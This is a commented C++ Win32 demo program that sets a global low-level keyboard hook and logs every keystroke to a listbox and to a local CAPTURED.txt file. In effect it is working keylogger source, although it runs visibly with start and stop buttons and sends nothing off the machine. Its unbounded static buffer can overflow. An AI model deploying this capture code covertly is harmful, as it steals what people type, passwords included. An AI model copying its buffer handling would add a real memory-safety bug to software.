#include "KB_Hook.h"

/*
  *
  *
  * This code is a simple Windows application that uses a global low-level keyboard hook to intercept and write keystrokes to a file.
  * Here is a brief explanation of the main parts of the code:
  *
  * In the `KbHookProcLL` function, the hooked keyboard messages are processed. When the user presses a key,
  * information about the press is passed to this function via the `nCode`, `wParam` and `lParam` parameters.
  *
  * Inside `KbHookProcLL`, information about the pressed key and its character representation is retrieved. 
  * Then the character is written to the `buf` array.
  *
  * Then an instance of the `std::ofstream` class is created with the path to the file to which the data will be written (`C:\\...\\...\\...\\CAPTURED.txt`).
  * Flag ` std::ios_base::app` indicates that the data will be appended to the end of the file.
  *
  * If the file could not be opened, an error message is displayed in the application window.
  *
  * Then the character from the `buf` array is written to the file using the `< < ` operator. The `std::locale::global`
  * function is used to set the global locale, which may be needed to correctly write characters to a file in some cases.
  *
  * After writing the character to the file, the file is closed.
  *
  * At the end of the `KbHookProcLL` function, the `CallNextHookEx` function is called to transfer control to the next hook in the chain.
  *
  * In the `StartKbHookLL` and `StopKbHookLL` functions, the global keyboard hook is started and stopped using the `
  * SetWindowsHookEx` and `UnhookWindowsHookEx` functions, respectively.
  *
  * The `WndProc` function handles messages related to window creation, buttons, and other interface elements.
  *
  *
*/

#define MAX_LOADSTRING 100
#define CMD_KB_LL_START 1001
#define CMD_KB_LL_STOP 1002

HINSTANCE hInst;
WCHAR szTitle[MAX_LOADSTRING];
WCHAR szWindowClass[MAX_LOADSTRING];
WCHAR txt[100];
HWND list;
HHOOK kbLL;

ATOM MyRegisterClass(HINSTANCE hInstance);
BOOL InitInstance(HINSTANCE, int);
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);
DWORD CALLBACK StartKbHookLL(LPVOID);
DWORD CALLBACK StopKbHookLL(LPVOID);
LRESULT CALLBACK KbHookProcLL(int, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{    // Initializes the application, processes messages from the queue, and exits when a WM_QUIT message is received. 
    // It also loads application resources and uses accelerators to process keyboard shortcuts.
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_KBHOOK, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    if (!InitInstance(hInstance, nCmdShow))
        return FALSE;

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_KBHOOK));
    MSG msg;

    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int)msg.wParam;
}

ATOM MyRegisterClass(HINSTANCE hInstance)  // Registering a window class, defining its style, window procedure,
{                                         // icons, cursor, background, and other attributes.
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDC_KBHOOK));
    wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_KBHOOK);
    wcex.lpszClassName = szWindowClass;
    wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));


    return RegisterClassExW(&wcex);
}

BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)  // Сreates and displays the application window, and performs the necessary updates and
{                                                    // checks to correctly initialize the instance.
    hInst = hInstance;

    HWND hWnd = CreateWindowExW(0, szWindowClass, szTitle, WS_OVERLAPPEDWINDOW & ~WS_SIZEBOX, 100, 100, 400, 500, nullptr, nullptr, hInstance, nullptr);

    if (!hWnd)
        return FALSE;

    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);

    return TRUE;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)  // Handles various messages.
{
    switch (message)
    {
    case WM_CREATE:
    {
        RECT clientRect;

        GetClientRect(hWnd, &clientRect);
        
        int clientWidth = clientRect.right - clientRect.left;
        int clientHeight = clientRect.bottom - clientRect.top;
        int listBoxWidth = 200;
        int listBoxHeight = 300;
        int listBoxX = (clientWidth - listBoxWidth) / 2;
        int listBoxY = (clientHeight - listBoxHeight - 50) / 2;

        list = CreateWindowW(L"Listbox", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | WS_VSCROLL, listBoxX, listBoxY, listBoxWidth, listBoxHeight, hWnd, 0, hInst, NULL);

        int buttonWidth = listBoxWidth;
        int buttonHeight = 23;
        int buttonX = listBoxX;
        int buttonY = listBoxY + listBoxHeight + 10;

        CreateWindowW(L"Button", L"LL Start", WS_VISIBLE | WS_CHILD, buttonX, buttonY, buttonWidth, buttonHeight, hWnd, (HMENU)CMD_KB_LL_START, hInst, NULL);
        
        buttonY += buttonHeight + 5;
        
        CreateWindowW(L"Button", L"LL Stop", WS_VISIBLE | WS_CHILD, buttonX, buttonY, buttonWidth, buttonHeight, hWnd, (HMENU)CMD_KB_LL_STOP, hInst, NULL);

        kbLL = 0;
        break;
    }
    case WM_COMMAND:
    {
        int wmId = LOWORD(wParam);

        switch (wmId)
        {
        case CMD_KB_LL_START:
            StartKbHookLL(NULL);
            break;
        case CMD_KB_LL_STOP:
            StopKbHookLL(NULL);
            break;
        case IDM_ABOUT:
            DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
            break;
        case IDM_EXIT:
            DestroyWindow(hWnd);
            break;
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
        }
    }
    break;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);

        EndPaint(hWnd, &ps);
    }
    break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)  // Represents the "About" dialog box handler function that handles messages 
{                                                                             // associated with a dialog box. If the message does not match any of the above, 
    UNREFERENCED_PARAMETER(lParam);                                          // FALSE is returned to indicate that the message was not processed by the dialog box handler.

    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;
    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}

DWORD CALLBACK StartKbHookLL(LPVOID param)  // The function is used to set and activate the interception 
{                                          // of low-level keyboard events and display information about the activation state in the listbox.
    if (kbLL != 0)
        _snwprintf_s(txt, 100, L"KB LL works");
    else
        kbLL = SetWindowsHookEx(WH_KEYBOARD_LL, KbHookProcLL, GetModuleHandle(NULL), 0);

    if (kbLL != 0)
        _snwprintf_s(txt, 100, L"KB LL activated true");
    else
        _snwprintf_s(txt, 100, L"KB LL activated false");
    SendMessageW(list, LB_ADDSTRING, 0, (LPARAM)txt);

    return 0;
}

DWORD CALLBACK StopKbHookLL(LPVOID param)  // The function is used to disable the global procedure for intercepting 
{                                         // low-level keyboard events and displaying information about the connection state in the listbox.
    if (kbLL != 0)
    {
        UnhookWindowsHookEx(kbLL);

        kbLL = 0;

        _snwprintf_s(txt, 100, L"KB LL true");
    }
    else
        _snwprintf_s(txt, 100, L"KB LL false");
    SendMessageW(list, LB_ADDSTRING, 0, (LPARAM)txt);

    return 0;
}

LRESULT CALLBACK KbHookProcLL(int nCode, WPARAM wParam, LPARAM lParam)  // In general, this function intercepts keyboard keystrokes, writes information about them to a 
{                                                                      // file, and displays the information in a listbox.
    std::ofstream file("C:\\KB_Hook\\KB_Hook\\CAPTURED.txt", std::ios_base::app);  // <-- Paste your path where the file is located here.
    static char buf[100];

    if (!file.is_open())
        SendMessageW(list, LB_ADDSTRING, 0, (LPARAM)L"Can not open file");

    if (nCode == HC_ACTION)
    {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lParam);
            UINT sym = MapVirtualKeyExW(keyInfo.vkCode, MAPVK_VK_TO_CHAR, GetKeyboardLayout(0));

            _snwprintf_s(txt, 100, L"%d (%d): %c", keyInfo.vkCode, keyInfo.scanCode, (char)sym);
            SendMessageW(list, LB_ADDSTRING, 0, (LPARAM)txt);

            buf[std::strlen(buf)] = static_cast<char>(sym);
            buf[std::strlen(buf) + 1] = '\0';

            std::locale::global(std::locale(""));

            file << buf << std::endl;
        }
    }

    file.close();
    return CallNextHookEx(kbLL, nCode, wParam, lParam);
}